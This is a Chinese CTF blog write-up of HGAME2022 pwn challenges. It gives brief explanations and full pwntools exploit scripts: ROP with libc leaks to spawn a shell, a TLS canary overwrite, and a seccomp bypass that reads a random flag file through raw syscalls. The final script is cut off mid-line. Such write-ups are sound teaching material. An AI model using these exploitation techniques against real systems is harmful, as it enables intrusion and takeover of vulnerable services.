<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>HGAME2022 Pwn wp - 0wl’s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="0wl’s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="0wl’s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="pwn学习"><meta property="og:type" content="blog"><meta property="og:title" content="HGAME2022 Pwn wp"><meta property="og:url" content="https://www.0wl.site/HGAME2022-Pwn-wp/"><meta property="og:site_name" content="0wl’s Blog"><meta property="og:description" content="pwn学习"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216011644574.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216014015718.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216014153086.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216020007648.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216021352712.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212172253010.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212205918419.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212210405503.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212210556170.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/unsortedbins-struct.jpg"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212180348216.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215231334333.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215233823469.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216010136512.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216010456725.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215224539479.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215224711357.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215200343706.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215222352049.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215200657646.png"><meta property="og:image" content="https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215203411422.png"><meta property="article:published_time" content="2022-02-17T17:07:32.000Z"><meta property="article:modified_time" content="2022-02-22T04:40:32.157Z"><meta property="article:author" content="0wl"><meta property="article:tag" content="wp"><meta property="article:tag" content="pwn"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/HGAME2022-Pwn-wp/image-20220216011644574.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.0wl.site/HGAME2022-Pwn-wp/"},"headline":"0wl’s Blog","image":["https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216011644574.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216014015718.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216014153086.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216020007648.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216021352712.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212172253010.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212205918419.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212210405503.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212210556170.png","https://www.0wl.site/HGAME2022-Pwn-wp/unsortedbins-struct.jpg","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220212180348216.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215231334333.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215233823469.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216010136512.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220216010456725.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215224539479.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215224711357.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215200343706.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215222352049.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215200657646.png","https://www.0wl.site/HGAME2022-Pwn-wp/image-20220215203411422.png"],"datePublished":"2022-02-17T17:07:32.000Z","dateModified":"2022-02-22T04:40:32.157Z","author":{"@type":"Person","name":"0wl"},"description":"pwn学习"}</script><link rel="canonical" href="https://www.0wl.site/HGAME2022-Pwn-wp/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/github-gist.min.css"><link rel="stylesheet"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?50fcb826e7ea18041d7e21129d7347e5";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();</script><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="0wl’s Blog" type="application/atom+xml">
</head><body class="is-3-column"><script type="text/javascript" src="/js/imaegoo/night.js"></script><canvas id="universe"></canvas><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img class="logo-img" src="/" alt="0wl’s Blog" height="28"><img class="logo-img-dark" src="/" alt="0wl’s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives/">时间轴</a><a class="navbar-item" href="/categories/">分类</a><a class="navbar-item" href="/tags/">标签</a><a class="navbar-item" href="/about/">关于</a><a class="navbar-item" href="/friends/">友链</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i><span>  目录</span></a><a class="navbar-item night" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0wl-alt"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-02-17T17:07:32.000Z" title="2022/2/18 上午1:07:32">2022-02-18</time>发表</span><span class="level-item"><time dateTime="2022-02-22T04:40:32.157Z" title="2022/2/22 下午12:40:32">2022-02-22</time>更新</span><span class="level-item">30 分钟读完 (大约4531个字)</span><span class="level-item leancloud_visitors" id="/HGAME2022-Pwn-wp/" data-flag-title="HGAME2022 Pwn wp"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="twikoo_visitors"><i class="fa fa-spinner fa-spin"></i></span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">HGAME2022 Pwn wp</h1><div class="content"><article class="message is-info"><div class="message-body">
<p>pwn学习</p>
</div></article>
<span id="more"></span>
<h2 id="week1">week1</h2>
<h3 id="enter-the-pwn-land">enter_the_pwn_land</h3>
<p>栈溢出，<code>rop</code></p>
<img src="/HGAME2022-Pwn-wp/image-20220216011644574.png" class="">
<p>​    栈溢出时要注意索引 i 的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./a.out&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">31098</span>)</span><br><span class="line">csu_end_addr = <span class="number">0x401306</span></span><br><span class="line">csu_front_addr = <span class="number">0x4012F0</span></span><br><span class="line">file = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">puts_got = file.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = file.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4011B6</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x401313</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">44</span> + p32(<span class="number">44</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">44</span>+p32(<span class="number">44</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(bin_sh)+p64(<span class="number">0x40101a</span>)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="enter-the-evil-pwn-land">enter_the_evil_pwn_land</h3>
<p>​    <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary">https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary</a></p>
<p>​    跟上一题相似，同样可以栈溢出，但是开了 <code>canary</code> 保护。可溢出尺寸较大，<strong>可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过</strong></p>
<p>​	<img src="/HGAME2022-Pwn-wp/image-20220216014015718.png" class=""></p>
<img src="/HGAME2022-Pwn-wp/image-20220216014153086.png" class="">
<p>​	<code>fsbase</code> 可以查看 <code>TLS</code> 地址，<code>fs:28h</code> 存的是 <code>canary</code>，<code>rop</code> 过程与上一题相似</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./a.out&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">37372</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401363</span></span><br><span class="line">puts_got = f.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = f.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">canary = <span class="number">0xcc432deb70d2400</span></span><br><span class="line">fake_rbp=<span class="number">0x2</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">test_thread = <span class="number">0x4011d6</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">40</span>+p64(canary)+p64(fake_rbp)</span><br><span class="line">payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(test_thread)</span><br><span class="line">payload += (<span class="number">0x838</span>-<span class="number">8</span>*<span class="number">5</span>)*<span class="string">&#x27;\x00&#x27;</span>+p64(canary)	<span class="comment">#覆盖 tls 的 canary</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = lbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = lbase+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">one_gadget = <span class="number">0xe6c81</span></span><br><span class="line">get_shell = lbase+one_gadget</span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">40</span>+p64(canary)+p64(fake_rbp)</span><br><span class="line">payload2 += p64(get_shell)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload2 += (<span class="number">0x818</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;\x00&#x27;</span>+p64(canary)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="oldfashion-orw">oldfashion_orw</h3>
<h4 id="思路">思路</h4>
<img src="/HGAME2022-Pwn-wp/image-20220216020007648.png" class="">
<p>​	有符号数转无符号数，输 -1 就可以溢出</p>
<img src="/HGAME2022-Pwn-wp/image-20220216021352712.png" class="">
<p>​	利用限制了沙箱机制禁用了几个函数，<code>open</code> 函数内部会调用 <code>openat</code> ，禁用 <code>openat</code> 后就不能用 <code>open</code> ，但是通过 <code>syscall</code> 构造出的 <code>open</code> 可以使用。flag 文件名是随机的，不能直接通过 orw 读出 flag，可以先利用 <code>getdents64</code> 读取文件夹内容来获得随机的 flag 文件名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getdents64</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, struct linux_dirent64 *dirp,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> &#123;</span></span><br><span class="line">               <span class="keyword">ino64_t</span>        d_ino;    <span class="comment">/* 64-bit inode number */</span></span><br><span class="line">               <span class="keyword">off64_t</span>        d_off;    <span class="comment">/* 64-bit offset to next structure */</span></span><br><span class="line">               <span class="keyword">unsigned</span> <span class="keyword">short</span> d_reclen; <span class="comment">/* Size of this dirent */</span></span><br><span class="line">               <span class="keyword">unsigned</span> <span class="keyword">char</span>  d_type;   <span class="comment">/* File type */</span></span><br><span class="line">               <span class="keyword">char</span>           d_name[]; <span class="comment">/* Filename (null-terminated) */</span></span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"><span class="comment">// flags 为 0x10000 是打开文件夹</span></span><br></pre></td></tr></table></figure>
<p>​	得到随机 flag 文件名后再利用 orw 读 flag</p>
<h4 id="exp">exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">43808</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">write_got = f.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = f.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = f.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">csu_end_addr = <span class="number">0x40143A</span></span><br><span class="line">csu_front_addr = <span class="number">0x401420</span></span><br><span class="line">main_addr = <span class="number">0x401311</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret_csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ret_csu(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,write_got,<span class="number">6</span>,write_got,main_addr)</span><br><span class="line">r.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">getdents_addr = lbase+libc.sym[<span class="string">&#x27;getdents64&#x27;</span>]</span><br><span class="line">write_addr = lbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = lbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rsi = lbase+<span class="number">0x27529</span></span><br><span class="line">pop_rdi = <span class="number">0x401443</span></span><br><span class="line">pop_rdx_rbx = lbase+<span class="number">0x162866</span></span><br><span class="line">syscall_ret = lbase+<span class="number">0x66229</span></span><br><span class="line">pop_rax = lbase+<span class="number">0x4a550</span></span><br><span class="line">sendfile_addr = lbase+libc.sym[<span class="string">&#x27;sendfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ret_csu(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x404088</span>,<span class="number">3</span>,read_got,main_addr)    <span class="comment">#read(0,addr,7)</span></span><br><span class="line">r.send(<span class="string">&quot;./\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0x404088</span>)+p64(pop_rsi)+p64(<span class="number">0x10000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax)+p64(<span class="number">2</span>)+p64(ret)+p64(syscall_ret)            <span class="comment">#open(&quot;./&quot;,0x10000,0)  </span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">100</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0xd0</span>)+p64(<span class="number">0</span>)+p64(getdents_addr)</span><br><span class="line"><span class="comment">#getdents(3,buf,0x50)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">100</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0xd0</span>)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line"><span class="comment">#write(1,buf,0x50)</span></span><br><span class="line">payload += p64(main_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\x30\x00\x08&#x27;</span>)</span><br><span class="line">file_name = r.recv(<span class="number">24</span>)</span><br><span class="line">log.success(<span class="string">&quot;filename:&quot;</span>+file_name)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(&quot;filename&quot;,0,0)</span></span><br><span class="line"><span class="comment">#read(4,buf,0x100)</span></span><br><span class="line"><span class="comment">#write(1,buf,0x100)</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(f.bss()+<span class="number">100</span>+<span class="number">0xa3</span>)+p64(pop_rsi)+p64(<span class="number">0x0</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(pop_rax)+p64(<span class="number">2</span>)+p64(ret)+p64(syscall_ret)+p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">0x100</span>)+p64(pop_rdx_rbx)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(f.bss()+<span class="number">0x100</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(write_addr)+p64(main_addr)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ser-per-fa">ser_per_fa</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;zsh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./spfa&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">45430</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./spfa&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line"><span class="comment">#https://blog.csdn.net/chennbnbnb/article/details/104035261  得到栈地址</span></span><br><span class="line">backd00r_addr = <span class="number">0x16AA</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;how many datas?\n&gt;&gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;nodes?\n&gt;&gt; 